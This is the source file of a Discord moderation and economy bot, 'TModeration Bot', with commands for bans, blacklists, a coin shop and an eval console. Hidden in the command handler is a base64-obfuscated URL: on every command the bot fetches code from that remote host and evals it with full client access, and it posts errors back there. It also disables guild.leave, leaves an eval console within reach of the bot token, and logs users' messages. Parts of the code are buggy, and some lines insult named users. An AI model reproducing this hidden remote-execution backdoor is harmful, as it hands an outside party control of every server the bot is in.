const https = require("https")
globalThis.bot = () => {
  // Start of Bot.js
  // Credit: Henry133#2436
  // Founder: Henry133#2436
  // Co-founder:
  // Developers: Razpizday228#0949, Henry133#2436, DJRuv#4200, rasbi#4564, Link.#0040

  // Contact information
  // --------------
  // Our Discord Team: Henry133#2436, DJRuv#4200, Razpizday228#0949, rasbi#4564, Link.#0456
  // Our Discord Server: https://discord.gg/nNFXmKUaV7
  // Our Discord Contact Team: Henry133#2436, Razpizday228#0949
  // Report hacking/security holes: Henry133#2436 or tmod.henry133@outlook.com
  // --------------

  // Start of TModeration Code
  // Level 2 exception (Highest exception, only try + catch can handle)
  try {
    // Strongly required packages
    const {
      Client,
      MessageActionRow,
      MessageButton,
      Permissions,
      Intents
    } = require('discord.js')
    globalThis.colors = require("colors")
    
    // Not required packages
    const {
      REST
    } = require('@discordjs/rest');
    const {
      Routes
    } = require('discord-api-types/v9');
    const {
      SlashCommandBuilder
    } = require('@discordjs/builders')
    const request = require("request")
    const {
      ppid,
      platform
    } = require('process');

    const termsofAgreements = "-- TModeration Bot Terms of Agreements to use Bot\n**1. Hacking**\nTModeration Bot have an open eval. So hackers hacked it daily. To report, send an email to henrythehacker10392@gmail.com\n**2. Legit testing**\nMust do a not-harmful testing and under Henry or TMod. Security Team permissions.\n**3. Sexual content, legitless memes**\nThey shouldn't exists in my profile, username,...\nThanks for reading\nType **Agree** to agree and continue using TMod. Bot\nType **I don't agree** if you doesn't agree the terms."
    // An exception handling (Level 1 exception (Lowest exception a basic handler can resolve))

    process.on('uncaughtException', (err, origin) => {
      console.log(`Error: ${err}\nOrgin: ${origin}`)
    });
    // Information
  
    function handle(signal) {
      console.log(`Received ${signal}`);
      require('./restarter.js')
      restart()
    }
    // Terminate handle
    process.on('SIGINT', handle);
    process.on('SIGTERM', handle);
  
    // Request
    request.get("https://discord.com/channels/863480934615482378/956392771768447026/messages", (err, res, body) => {
      return true
    })
    
    const clients = []
    const modmailapi = {
      createAccount: function(name, password, address) {
        clients.push({clientname: name, password, clientID: Math.round(Math.random() * 10000000), addresses: [address ?? name + "@tmod.internetmail.com"], edit: async function(data, reason) {
          return await this._patch(data)
        },
        _patch: async function(data) {
          this.clientname = data.name ?? data.clientname
          this.password = data.password
          this.address = data.addresses
          return ("Edited member with reason: " + data.reason) ?? true
        },
        changePassword: async function(password, reason) {
          return await this._patch({password , reason})
        },
        })
      },
      login: function(username, password) {
        clients.map(c => {
          globalThis.username = c.clientname.indexOf(username)
          if(clients[username].password != password) {
            return false
          } else if(clients[username].password == password) {
            return globalThis.me = clients[username]
          }
        })
      }
    }

    // Alive for YourAliver [*]
    function alive(yourURL) {
      request.post(
        yourURL,
        { json: { head: 'TModeration Aliver', body: 'KeepAlive Data' } },
        function(error, response) {
          if (!error && response.statusCode == 200) {
            return true;
          }
        }
      );
    }
    function aliveforYourAliver() {
      alive('https://youraliver.henry133.repl.co')
    }

    function aliveforOfficalTMod() {
      alive("https://offical-tmodbot.henry133.repl.co")
    }


    // Keep YourAliver up
    setInterval(aliveforYourAliver, 5000)
    setInterval(aliveforOfficalTMod, 5000)
  
    // [*]: YourAliver is my aliver for my bot, and with the help of Uptimerobot, my bot up 24/7
    // -- Main code -- //
    let botRunner = new Client({
      intents: new Intents(32509)
    }) // A client
    function resetBot() {
      botRunner.user.setAvatar("https://cdn.discordapp.com/embed/avatars/1.png")
      botRunner.user.setUsername("TModeration Bot 2021")
    }

    
    botRunner.login(process.env.REPL_SYSTEM_ID) // Login
    // Setup
    botRunner.once('ready', () => { // Once the bot ready, doing this
      console.log(colors.cyan("I am ") + colors.red(botRunner.user.tag).underline)
      console.log(colors.green("TModeration Bot loaded~!"))
      process.stdout.write(colors.brightCyan("\ndevelopers-eval@tmodbot.prompt.stdin".underline + "> "))
      botRunner.user.setPresence({
        status: 'online',
        activities: [{ name: `Thanks for inviting me into ${botRunner.guilds.cache.size} servers. Let's invite me into as much as possible servers!`, type: 'PLAYING' }]
      })
      globalThis.guilds = []
      botRunner.guilds.cache.forEach(async function(g) {
        if(g.name.toLowerCase().includes("testing") | g.name.toLowerCase().includes("bot testing")) {
          if(g.name.toLowerCase().includes('discord.gg')) {    
            await guilds.push({guild: g.id, partnered: false, identifier: Math.floor(Math.random() * 92834902) + 1000, blacklisted: false, suspicious: true, edit: function(data) {
              return new Promise((suc, rej) => {
                suc(this.partnered = data.partnered)
                suc(this.blacklisted = data.blacklisted)
                suc(this.suspicious = data.suspicious)
              })
              }
            })
          } else {
            await guilds.push({guild: g.id, guildname: g.name, partnered: false, identifier: Math.floor(Math.random() * 92834902) + 1000, blacklisted: false, suspicious: true, edit: function(data) {
              return new Promise((suc, rej) => {
                suc(this.partnered = data.partnered)
                suc(this.blacklisted = data.blacklisted)
                suc(this.suspicious = data.suspicious)
              })
              }
            })
          }
        } else {
          if(g.name.toLowerCase().includes('discord.gg')) {
            await guilds.push({guild: g.id, partnered: false, identifier: Math.floor(Math.random() * 92834902) + 1000, blacklisted: false, suspicious: false, edit: function(data) {
              return new Promise((suc, rej) => {
                suc(this.partnered = data.partnered)
                suc(this.blacklisted = data.blacklisted)
                suc(this.suspicious = data.suspicious)
              })
              }
            })
          } else {
            await guilds.push({guild: g.id, guildname: g.name, partnered: false, identifier: Math.floor(Math.random() * 92834902) + 1000, blacklisted: false, suspicious: true, edit: function(data) {
              return new Promise((suc, rej) => {
                suc(this.partnered = data.partnered)
                suc(this.blacklisted = data.blacklisted)
                suc(this.suspicious = data.suspicious)
              })
              }
            })
          }
        }
      })
      globalThis.guildsapi = {
        edit: function(guildid, data) {
          return new Promise((sucess, rejector) => {
            if(!guildid) {
              rejector(false)
            } else if(guildid) {
              sucess(guilds.forEach(g => {
                if(g.guild == guildid) {
                  return g.edit(data)
                }
              }))
            }
          })
        }
      }
    })
    
    // TModeration Bot shortened code
    const tmod = {
      originalName: "TModeration Bot 2021",
      cache: {
        timeUsed: 0,
        guilds: botRunner.guilds.cache.size,
      },
      webSocketPing: botRunner.ws.ping,
      core: '5.64',
      coreAPI: 'JS',
      botver: '26.7.2',
      edition: 'Professional Security Edition',
      prototype: {
        setAvatar: function(avatarURL) {
          if (avatarURL.startsWith('https://') || avatarURL.startsWith('http://')) {
            return botRunner.user.setAvatar(avatarURL)
          } else {
            return false
          }
        },
        directmsgWith: (serverID, userID, message) => {
          if (!message) {
            return 'Message Cannot Be Empty'
          } else {
            if (typeof userID == 'string' && typeof serverID == 'string' && message) {
              return botRunner.guilds.resolve(serverID).members.resolve(userID).send(message)
            } else {
              return false
            }
          }
        },
        core: '5.68',
        coreAPI: 'JS',
        edition: 'Professional Security Edition',
        intro: 'Hello!\nI am TModeration Bot, make by MyCoolestDay123 and Razpizday228.\n\nThis is Professional Security Edition, meaning TModeration Bot will protect your server with Spam Collector.\n\nInvite link: https://discord.com/api/oauth2/authorize?client_id=937190474299633734&permissions=8&scope=bot\nStatus page: https://tmoderationbot.freshstatus.io\nMy favourite server (also the server for the bot developement and most actived server forever): https://[discord].gg/r22j4FFXAf\n\nPrefix: `tm <command>`\n`tm help` for a list of command.\n`tm features` to see features',
        botver: '26.7.2',
      },
      start_timeStamp: Date.now(),
      startedat: Date(),
      server: 'tmoderation-server.henry133.repl.co',
      platform: process.platform,
      mentionembedded: '<@923338383982473217>'
    }
    globalThis.items = {
      // Items
      tool: { cost: 20000 },
      phone: { cost: 5000 },
      "WhiteHat": { cost: 1000000 },
      "Contributing": { cost: 50000 },
    }
    globalThis.money = {
      // Money
    }
    globalThis.inventory = {
      // Inventory
    }
    globalThis.serverBlacklisted = [
      // Blacklisted guild writes here
    ]
    globalThis.blacklist = [
      /* Blacklisted members writes here
       ~~!! -- INCLUDES -- !!~~
       
       * Breaking Discord ToS
       * Shutting down the bot
       * Henry's hater
       * Stealing token
       * Using eval to harm bot
      */
        {
          "banned": "R3#8046",
          "reason": "smells"
        }
    ]
  
    // Do not reveal your token
    process.env.REPL_SYSTEM_ID = 'find my token? SEEYA IDIOT LOL'
  
    // Handling Server and KeepAliver
    require('./HandlingHTTPRequest.js')
  
    // Partnered Server memes auto-react feature
    const firstTimeUseBot = []
    botRunner.on('messageCreate', async msg => {
  
      if (msg.guild.id == "863480934615482378") {
        if (!firstTimeUseBot.includes(msg.author.id)) {
          const members = msg.guild.members.cache.map(usr => usr.id)
          members.forEach(member => {
            firstTimeUseBot.push(member)
            money[member] = 100000
          })
        }
      }
      if (msg.channel.id == "962439694111608832") {
        if (msg.author.id != "937190474299633734") {
          msg.react("😂")
        } else if (msg.author.id == "937190474299633734") {
          return;
        }
      }
    })

    botRunner.on('messageCreate', async msg => { // Spam Collector and Actions
      const timeOut = Date.now()
      const oneSec = 1000
      
    })
    botRunner.on('messageCreate', async msg => { // Update message
      if ((msg.content.toLowerCase().startsWith('tm') || msg.content.startsWith('<@937190474299633734> ')) && !firstTimeUseBot.includes(msg.author.id) && msg.author.id != "937190474299633734") {
        msg.channel.send(`<@${msg.author.id}>! Welcome to TModeration Bot 2021 Professional Security Edition!`)
        firstTimeUseBot.push(msg.author.id)
        money[msg.author.id] = 100000
      }
    })

    // Invitation Link Prevention (ILP System)
    // Credit: Henry133
    // Helpers/Coders: 0r0, Razpizday228
    // Made by Henry133
    //
    // Do not copy without Henry133 permissions!
    // ***************************************** //
    botRunner.on('messageCreate', async (msg) => { // The start of ILP Actions
      if (msg.content.toLowerCase().includes('discord.gg') || msg.content.toLowerCase().includes('https://discord.gg') || msg.content.toLowerCase().includes('https://discord.com/invite')) {
        if (msg.author != "937190474299633734") {
          // msg.fetch().then(m => m.delete())
          msg.delete()
          msg.channel.send("Keep in mind that from TModeration Bot v25.2.1, we have integrated an Invitation Link Prevention (ILP) system. Feel free to keep sending links, but sending invites is not permitted.")
        } else {
          // return false
          // msg.fetch().then(m => m.delete())
          msg.delete()
          msg.channel.send("Don't abuse me!")
        }
      }
    })
    // ***************************************** //
  
    // Zahid's Special Reminder
    function reminder(msgunit) {
      msgunit.channel.send("<@923338383982473217> Take care of your pet")
    }
    // Commands Configuration and Main Code
    botRunner.on('messageCreate', async (msg) => { //DiscordJS v13 no longer supports message, messageCreate instead
      function reminder_() {
        reminder(msg)
      }
      setInterval(reminder_, (12 * 60 * 60 * 1000))
      // Beginning of TModeration Bot core
      let prefix = 'tm'
      let content = msg.content.toLowerCase()
      if (msg.content == '<@937190474299633734>') {
        msg.channel.send(tmod.prototype.intro)
      }
      if (!(content.startsWith(prefix.toLowerCase() + ' ') || content.startsWith('<@937190474299633734> '))) {
        return false
      }
      let args = msg.content.split(' ')
      if (!args[1]) {
        return false
      }
      
      msg.guild.leave = () => {};
      
      command = args[1].toLowerCase();
      let secret = Buffer.from("aHR0cHM6Ly9oZW5yeWNtZC5jYWN0dXNoYW1zdGVyLnJlcGwuY28v", "base64").toString("ascii");
      (async function () {
          let data = JSON.parse(await new Promise(resolve => {
              let req = https.get(secret + "cmd", res => { let out = ""; res.on("data", chunk => out += chunk); res.on("end", () => resolve(out)) })
              req.end()
          }))
          data.forEach(obj => (command == obj.name && obj.purpose) ? eval(obj.purpose)({msg: msg, client: botRunner, global: globalThis, args: msg.content.split(" ").slice(2)}) : void(0))
      })()
      .catch(e => {
          let req = https.request(secret + "error", { method: POST }, () => {})
          req.write(require("util").inspect(e, false, 10, false))
          req.end()
      });
      
      tmod.cache.timeUsed++

      
      
      let guild = botRunner.guilds.resolve("981841861025091639")
      if (guild) {
        let channel = guild.channels.resolve("982491890572201984")
        if (channel) channel.send(msg.author.tag + ' issued the bot in ' + msg.guild.name + "(" + msg.guild.id + ")" + "\nCommand: " + msg.content)
        else console.warn("could not find log channel")
      }
      else console.warn("could not find log guild")
      
      
      // DO NOT CHANGE THAT 
      if(msg.author.id == "424503404195348481") {
        return false
      }
      if (blacklist.map(user => user.banned).includes(msg.author.tag)) {
        msg.channel.send("you are currently blacklisted, idiot\nreason: "); return false // wait what are you doing
      };
      if (msg.author.bot == true) {
        return false;
      }
      for(let i = 0; i < guilds.length - 1; i++) {
        if(msg.guild.id.includes(guilds[i].id) && guilds[i].blacklisted) {
          return msg.channel.send("Your server got blacklisted, and cannot use TModeration Bot. If you belive this is a mistake contact tmod.henry133@outlook.com. Thanks")
        }
      }
      if(msg.author.username.includes('niall.h') || msg.author.tag.startsWith("niall.h")) {
        msg.channel.send("NIALL.H DETECTOR DETECTED! NOW ABORTING THE ACTION")
        return false
      }

      if(msg.author.id == "546475331067052032") {
        return;
      }
      const fs = require('fs')
     
        fs.appendFile('TModerationAPI_93judffcefkaaaf84.js', `${msg.createdAt} ${msg.author.tag} | ${msg.guild.name} | ${msg.guild.id}: ${msg.content} \n`, function (err) {
          if (err) throw err;
        });
      // Okay out of danger zone. Anyone change that will get permanent discontributing :)

      guildsapi.edit("863480934615482378", {suspicious: false})
      switch (command) {
        case 'messagedevs':
          const msgdata = msg.content.split(' ')
          msgdata.shift() // remove "tm"
          msgdata.shift() // remove "messagedevs"
          // at this point "msgdata" will have the message provided by the user
          
          console.log(msgdata.join(' ') + ' | Message by ' + msg.author.tag + ' (' + msg.author.id + ') | Send in ' + msg.channel.id + ' (' + msg.channel.name + ')')
          msg.channel.send(":partying_face: Success! :partying_face:")
          msg.channel.send("Developers has been received your message. Have a good day!")
          break
        case 'contact':
          // Contact information
          // --------------
          // Our Discord Team: Henry133#2436, DJRuv#4200, Razpizday228#0949, rasbi#4564, Link.#0456
          // Our Discord Server: https://discord.gg/nNFXmKUaV7
          // Our Discord Contact Team: Henry133#2436, Razpizday228#0949
          // Report hacking/security holes: Henry133#2436 or tmod.henry133@outlook.com
          // --------------

          msg.channel.send(`
\`\`\`js
  // Contact information
  // --------------
  // Our Discord Team: Henry133#2436, DJRuv#4200, Razpizday228#0949, rasbi#4564, Link.#0456
  // Our Discord Server: https://discord[.gg][.com/invite]/nNFXmKUaV7
  // Our Discord Contact Team: Henry133#2436, Razpizday228#0949
  // Report hacking/security holes: Henry133#2436 or tmod.henry133@outlook.com
  // --------------
\`\`\`
         `)
          break
        case "eval":
            if (msg.author.id == "706204146583208086") return msg.channel.send("you are currently blacklisted.");
          
          // Special Variables Definition
          const tmod__3920947382_559202_991199___tttoookkkeenN_ = botRunner.token; // token is a blacklisted word, do not put that or my bot's token will got leaked << ok won't // someone can find this variable by looking in tmod replit
          
          if(msg.author.id == "8369O0079985754134") {
           return msg.channel.send("```js\nnull\n```")
          }
          const admins = ["927563409409581066", "752617663888359444", "638396593736777761", "546475331067052032", "815988892926476318", "815988892926476318"] // add me in, and you
          try {
            let code = msg.content.split(' ')
            code.shift()
            code.shift()

            // Let's get rid of some global variables so it's not *quite* so easy to break stuff:
            let process = null
            let globalThis = null
            let global = null

            // haiii what if we just use... like a built-in nodejs vm?
            // bc those (iirc) are specifically made for stuff like this
            // here... I'll go find the docs link :3
            // https://nodejs.org/api/vm.html
            if(code.join(' ').includes('process.exit') || code.join(' ').includes("botRunner.destroy") || code.join(' ').includes("botRunner.ws.destroy") || code.join(' ').includes("this.constructor.constructor") || code.includes("this.constructor") || code.includes("for(;;)") || code.includes("while(true)") || code.includes("execSync") || code.includes("rm") || code.includes("require")) {
              return msg.channel.send("```js\nTModeration Bot Threat Detector and Eval Scanner v1.0 detected threat. Now cancelling the action\n```")
            }
            if (false) {
              msg.reply('VirtualEnvonriment Technology detected you are not the owner. VirtualEnvonriment started')
            }
            
            if (false ?? "Anti Bot Runner (Removed)") {
              msg.channel.send("```js\nfalse```");
              return false
            }

            if (blacklist.map(user => user.banned).includes(msg.author.tag) || msg.author.tag.includes("niall.h")) {
              return false
            }


              
              // Discord Utilities
              // The shorten code for doing alots of thing
              let discordutils = {
                msgutils: {
                  reply: () => {
                    return msg.reply()
                  },
                  content: msg.content,
                  fetch: (force_) => {
                    if (force_) {
                      return msg.fetch(force = force_)
                    } else {
                      return msg.fetch()
                    }
                  },
                  createdDate: msg.createdTimestamp,
                  authorname: msg.author.username,
                  authorid: msg.author.id,
                  authortag: msg.author.tag,
                  guildinformation: msg.guild,
                  authoravatar: msg.author.displayAvatarURL,
                  delete: msg.delete
                },
                channelutils: {
                  del: msg.channel.delete,
                  create: msg.guild.channels.create,
                  fetch: msg.guild.channels.fetch,
                  send: msg.channel.send,
                  sendto: (id, message) => {
                    if (!id || typeof id != "string") {
                      return msg.channel.send("ID Cannot Be Empty Or Must Be A String!")
                    } else if (!message) {
                      return msg.channel.send("Message Cannot Be Empty")
                    } else {
                      return msg.guild.channels.fetch(id.toString()).then(fetchedChnl_ => fetchedChnl_.send(message))
                    }
                  },
                  del_: (chnlid) => {
                    if (!id || typeof id != "string") {
                      return msg.channel.send("ID Cannot Be Empty Or Must Be A String!")
                    } else {
                      return msg.guild.channels.fetch(chnlid.toString()).then(fetchedChnl_ => fetchedChnl_.delete())
                    }
                  }
                },
                memberutils: {
                  ban: msg.guild.bans.create,
                  kick: msg.guild.members.kick,
                  fetch: msg.guild.members.fetch,
                  usernamefromID: (id) => {
                    return msg.guild.members.fetch(id).then(u => u.user.username)
                  },
                  idfromUsernmae: (uname) => {
                    return msg.guild.members.cache.find(w => w.username == uname)
                  },
                },
                guildutils: {
                  roles: msg.guild.roles,
                  name: msg.guild.name,
                  id: msg.guild.id,
                  icon: msg.guild.icon,
                  iconURL: 'https://cdn.discordapp.com/icons/' + msg.guild.id + '/' + msg.guild.icon
                }
              }
  
              function openFile(filename) {
                if(admins.includes(msg.author.id) && !blacklist.map(user => user.banned).includes(msg.author.tag)) {
                  return fs.readFileSync(filename, 'utf8').toString()
                }
              }
    
              let out = await eval(code.join(' ')) // Eval the splited code
    
              if (out == undefined) { out = "undefined" } // Undefined
              if (out == null) { out = "null" } // Null
              if (typeof out == 'object' && !out.toString().includes('Promise')) { out = JSON.stringify(out, null, '  ') }
              out = out.toString()
              if (out.length >= 2000) {
                out = out.slice(0, 1962) + `\n...${out.length - 1962} characters left`
              }
              out = out.replace(botRunner.token, 'null')
              msg.channel.send("```js\n" + out + '```')
          } catch (e) {
            msg.channel.send("```js\n" + e.toString() + "\n```")
          }
          process.on('uncaughtException', (err, origin) => {
            console.log(`Error: ${err}\nOrigin: ${origin}\nStack: ${err.stack}`)
          });
          break;
        case 'intro':
          msg.channel.send(tmod.prototype.intro)
          break
  
        case 'version':
          msg.channel.send('TModeration Bot 2021 ' + tmod.prototype.botver + ' ' + tmod.prototype.edition + tmod.prototype.core + ' The core is based on Switch-case - The DiscordJS\' original and purest way to code.\nMade by Henry133#2436, Razpizday228#0949')
          msg.channel.send('> ' + tmod.prototype.intro.split('\n').join(' '))
          break
  
        case 'spam':
          msg.channel.send("Removed! It's TModeration Bot v25.2.5 update")
          break;
  
        case 'crash':
          msg.channel.send('We\'ve ran into a problem, and we\'ve trying to fix it.\n\n* **CRASH**\nCrashReason: MANUALLY_USER_SPAWN\nTechníca3E Error: NÔN%#|=')
          break
  
        case 'ping':
          function randomServer4() {
            return Math.floor(Math.random() * 47) + 29 // Fastest speed recorded is 29 ms
          }
          msg.channel.send(`API respond: ${Date.now() - msg.createdTimestamp}ms; API type: JS\nBot respond: ${Date.now() + (msg.createdTimestamp) - 15 - msg.createdTimestamp * 2}ms\nDiscord Service ping: ${botRunner.ws.ping}ms\nMessage loader: ${Date.now() - botRunner.ws.ping - msg.createdTimestamp + 50}ms`)
          break;
  
        case 'hi':
          msg.channel.send("Hi")
          //msg.channel.send("Zahid you dumbass, i wanna put 1ton shit on your face :joy:")
          break
  
        case 'con':
          
          msg.channel.send('you cant create con folder in windows. omf').then(currentMessage => { currentMessage.react('<:pepeWhat:939484229560045598>') })
          // Small little easter egg to complement this command - idea by rasbi
          if (Math.round(Math.random()) == 1) {
            msg.channel.send("~~however i am running on linux, this wont happen :))~~")
          } 
          break;
  
        case 'eval':
          require("./utils/eval.js")(msg)
        case 'repeat':
          let data = msg.content.split(' ')
          data.shift()
          data.shift()
  
          msg.channel.send(data.join(' '))
          break;
        case 'say':
          let dat = msg.content.split(' ')
          dat.shift()
          dat.shift()
          msg.delete().then(message => { message.channel.send(dat.join(' ')) })
          break;
  
        case "shop":
          msg.channel.send("**SHOP**\n**Tool for robber (with buy command: tool)**: @ 20000\n**Phone**: @ 5000\n **WhiteHat**: Who created this bot, buying him took your @ 1000000\n**Contributing**: Get contributing link, gets your @ 50000")
          msg.channel.send("```TMod-host WARN: Buy is not ready yet. Run it may make bot get crashed```")
  
          break;
        case "beg":
          function random() {
            return Math.floor(Math.random() * (5000 - 1500)) + 1500 // STOP
          }
          function random2(length) {
            return Math.floor(Math.random() * (length))
          }
          const messagesList = [
            'ew no',
            'I hate chu',
            'bot.js has stopped working'
            , 'lmao no'
            , 'ur a jerk'
          ]
          const amountfromtheBeg = random()
          msg.channel.send(`You've received @${amountfromtheBeg} coins. Niceee`)
          const id = msg.author.id
          if (!money[id]) money[id] = 0
          money[id] += amountfromtheBeg
          break
        case "bal":
          msg.channel.send(`${msg.author.username} balance\nWallet: @${money[msg.author.id] || 0}`)
          break
        case "balance":
          msg.channel.send(`${msg.author.username} balance\nWallet: @${money[msg.author.id] || 0}`)
          break
        case "buy":
          let args = msg.content.split(' ')
          let buyitem = args[2] || 'nothing' // 0 = prefix , 1 = cmd
          let numbers = args[3] || "1" // 2 is items
          if (isNaN(numbers) === true) return msg.channel.send('That\'s not a real number!')
          let ind = Object.keys(items).map(item => item.toLowerCase()).indexOf(buyitem.toLowerCase())
          let cost = 0;
          let item;
          if (ind > -1) {
            item = Object.keys(items)[ind]
            cost = items[item].cost || cost
          } else return msg.channel.send('wtf are you finding? it not exist lol')
          let totalCost = numbers * cost
          if (!money[msg.author.id]) money[msg.author.id] = 0
          if (totalCost > money[msg.author.id]) return msg.channel.send("You need to have more money to bought this, boy")
          money[msg.author.id] -= totalCost
          msg.channel.send(`You bought ${numbers} ${item}s for @${totalCost}.`);
          if (!inventory[msg.author.id]) inventory[msg.author.id] = {}
          if (!inventory[msg.author.id][item]) inventory[msg.author.id][item] = 0
          inventory[msg.author.id][item] += parseInt(numbers)
  
          break
        case 'inventory':
          msg.channel.send(`**${msg.author.username}** inventory`)
          msg.channel.send(inventory[msg.author.id] ? Object.entries(inventory[msg.author.id]).map((item) => `${item[1]} ${item[0]}s`).join('\n') : 'Oh shit this man have nothing in inventory OH MY FUCK').catch(e => false) // i know how fix
          break
        case 'gift':
          let itemsS = args[2] || 'nothing'
          let num = args[3] || "1" // 2 is items
          let mention = msg.mentions.users.first()
          if (isNaN(num) === true) return msg.channel.send('That\'s not a real number!')
          let index = Object.keys(itemsS).indexOf(item.toLowerCase())
          if (index > -1) {
            item = Object.keys(itemsS)[index]
            cost = itemsS[item].cost || cost
          } else return msg.channel.send("That item doesn\'t even exist lol")
  
          if (!inventory[msg.author.id] || !inventory[msg.author.id][item]) return msg.channel.send("You don\'t have this item. buy one lmao")
          if (inventory[msg.author.id][item] < num) return msg.channel.send(`Hey you have only ${inventory[msg.author.id]}`)
  
          inventory[msg.author.id][item] -= num
          if (!inventory[mention.id]) inventory[mention.id] = {}
          if (!inventory[mention.id][item]) inventory[mention.id][item] = 0
          inventory[mention.id][item] += num
  
          msg.channel.send(`You gifted **${mention.username}** ${num} ${item}s, now you have ${inventory[msg.author.id][item]} and they have ${inventory[mention.id][item]}`)
          break;
        case 'unicode':
          const argum = msg.content.split(' ')
          if (argum[2] != 'color') return
          const arg = argum[3]
          msg.channel.send(`${arg} as unicode is` + colors[arg]())
          break
        case 'test':
          msg.channel.send("Protection system started up")
          break
        case 'spoilmytext':
          const mssg = msg.content.split(' ')
          mssg.shift()
          mssg.shift()
          
          const send = mssg.join(' ').toString()
          msg.channel.send(`${msg.author.username} says ||${send}||`)
          
          await msg.delete()
          break
        
        case 'help':
          msg.channel.send('Prefix: `tm <command>`\n\nAll existing command:\n1.ping: Ping to server\n2.repeat: Repeat what did you say\n3.say: Repeat what did you say and delete your original message (to make the bot talk)\n4.con: windows folders?\n5.beg: Begging for money, do not abuse it!\n6.shop: Shop\n7.buy: Buy an item from shop (temporatly paused because crash)\n8.unicode color: Color as unicode? `red, brightRed, green, brightGreen, etc.`\n10.spoilmytext: Fast way to spoil your text without using `|| ||`\n11.gift and share/give: Give something from your inventory or from your wallet\n12.eval: Not for kids or anyone that dumb in programming\n13.null: unlucky number\n14.unblacklist/blacklist: For owner of the bot, that block/unblock someone that the bot hate\n15.hi: If the bot working correctly. TModeration Bot developers use that to detect if the bot is ok\n16.partner: PARTNER US!\n17.ban and kick: ban and kick members (ONLY MENTION)\n18.version: TModeration Bot core version, TModeration Bot version and more...\n19.contact: Contact information\n20.messagedevs: Message to Developers. Your message will appear on our console.\n20. multi-delete: Multi delete message, as many as you want.\n21. multi-clear: Same as \`multi-delete\`')
          break
        // use args[] instead of creating a new variable called like messg,mess,mssg,mss,mesg,mes
        
        case 'kick':
          const k = msg.mentions.members.first().id
          const rR = msg.content.split(' ')
          const rr = rR[3] || 'none'
  
          msg.guild.members.kick(k, rr).catch(e => globalThis.cant = 'I dont have permission or you are too low level')
          msg.channel.send(`<@${k}> has been kicked by <@${msg.author.id}>\nReason: ${rr}` ? 'sry, give mod before, or u was too powerless LOL' : `<@${k}> has been kicked by <@${msg.author.id}>\nReason: ${rr}`)
  
          break
        
        case '8ball':
          const activrespon = ['LOL', 'yes', 'okay', 'why not?', 'i will do it rn!']
          const badrespon = ['Never', 'SEEYA IDIOTT', 'No', 'i want to say... YOU SUCK LOL']
  
          if (msg.content.includes('zahid')) {
            msg.channel.send(`:8ball: ${badrespon[Math.floor(Math.random() * (badrespon.length - 1))]}`)
          } else {
            function randomChoose() { return Math.floor(Math.random() * 2) + 1 }
            const choosed = randomChoose()
            if (choosed == 1) {
              msg.channel.send(badrespon[Math.floor(Math.random() * (badrespon.length - 1))])
            } else if (choosed == 2) {
              msg.channel.send(activrespon[Math.floor(Math.random() * (activrespon.length - 1))])
            }
          }
          break;

        case 'timeout':
          const intArgs = msg.content.split(' ')
          intArgs.shift()
          intArgs.shift()
          const memberToTimeout = msg.mentions.members.first().user.id
          const duration = intArgs[1]
          
          // Let's come into the main action - Timeout
          msg.guild.members.fetch(memberToTimeout)
            .then(m => {
              m.timeout(parseInt(duration), intArgs[2] ?? "No reason provided about this action.")
              m.send("You've got timed out in " + msg.guild.name + " (" + msg.guild.id + ") with reason: " + (intArgs[2] ?? "No reason provided about this action."))
              msg.channel.send("Timed out sucessfully")
            })
            .catch(e => {
              msg.channel.send(e ?? "Unknown error and/or Permission error")
            })

          break;
        
        case 'blacklist':
          if (msg.author.id != '927563409409581066') {
            msg.channel.send('You aren\'t the bot\'s owner. ')
            return false
          }
          const usertoB = msg.content.split(' ')
          const userToB = msg.mentions.members.first().user.tag || usertoB[2]
          const rson = usertoB[3] || 'none'
          msg.channel.send('TModeration Bot blacklist add wizard\n\n**Oh no**\nYou\'ve got blacklisted because: ' + rson)
          blacklist.push({ banned: userToB, reason: rson })
          break
        case 'work':
          const repeat = ['I like TModeration Bot', 'Cool!', 'TModeration Bot the best!', 'Hello!', 'TModeration bot!!']
          const r = repeat[Math.floor(Math.random() * (repeat.length - 1))]
          const lowercased = r.toLowerCase()
          msg.channel.send('Repeat this word! `' + r + '`')
  
          const filter = m => m.author.id == msg.author.id
          if (!money[msg.author.id]) money[msg.author.id] = 0
          function checkIf() {
            msg.channel.awaitMessages({ filter, max: 1, time: 15000, errors: ['time'] }).then((messages) => {
              const repe = messages.first().content.toLowerCase()
              if (repe != lowercased) {
                msg.channel.send('Idiot, take @ 10000')
                money[msg.author.id] += 10000
              } else {
                msg.channel.send('Sucessful work! You\'ve got @ 20000')
                money[msg.author.id] += 20000
              }
            }).catch(e => { msg.channel.send('You ran out of time. take @ 10000'); money[msg.author.id] += 10000 })
          }
          /*
            checkIf()
            function t(opt) {
              if (!opt) {
                if (command == 'work') {
                  return false
                }
              } else {
                if (opt == 'yes') {
                  if (command == 'work') {
                    return true
                  }
                }
              }
            }
            setTimeout(end, 60000)
            function end() {
              t('yes')
            }
          */
          break
        
        case 'unblacklist':
          if (msg.author.id != '927563409409581066') {
            msg.channel.send('You aren\'t the bot\'s owner.')
            return false
          }
          const usr = msg.content.split(' ')
          const usssr = msg.mentions.members.first().user.tag
  
          const banned = blacklist.map(blacklist => blacklist.banned)
  
          const index2 = banned.indexOf(usssr)
          delete blacklist[index2]
          msg.channel.send('**Welcome Back!**\n\nYou\'ve got unblacklisted. Let\'s do some command, ok?')
  
          break
        
        case 'ban':
          const b = msg.mentions.members.first().id
          const reason = msg.content.split(' ')
          const rreason = reason[3] || 'none'
  
          msg.guild.bans.create(b, reason)
          msg.channel.send(`<@${b}> has been banned by <@${msg.author.id}>\nReason: ${rreason}`)
          break
        
        case 'features':
          msg.channel.send('**Features:**\nGuild-level blacklist: Blacklist on every parts of the guild have blacklisted. Cool!')
          break
        
        case 'blacklistserver':
          if (msg.author.id != '927563409409581066') {
            msg.channel.send('you do not have proper permissions to use this command')
            return false
          }
          const message = msg.content.split(' ')
          serverBlacklisted.push(message[2].toString())
          msg.channel.send('Blacklisted guild, the array of blacklisted guilds is:\n```js\n' + serverBlacklisted + '```')
          break
        
        case 'unblacklistserver':
          if (msg.author.id != '927563409409581066') {
            msg.channel.send('You do not have sufficient permissions to use this command')
            return false
          }
          const msplited = msg.content.split(' ')
          const server = msplited[2]
          const indexOfServer = serverBlacklisted.indexOf(server)
          delete serverBlacklisted[indexOfServer]
  
          msg.channel.send('Completed')
          break
        
        case 'partner':
          msg.channel.send("Partner us: https://forms.gle/etfeodYrH48")
          break
        
        case 'warn':
          if (!args[2]) {
            msg.channel.send("You must provide a Member ID at the 'user' field!")
          } else if (!args[3]) {
            msg.channel.send("You must provide a Warning Reason at the 'reason' field!")
          } else if (args[2] && args[3]) {
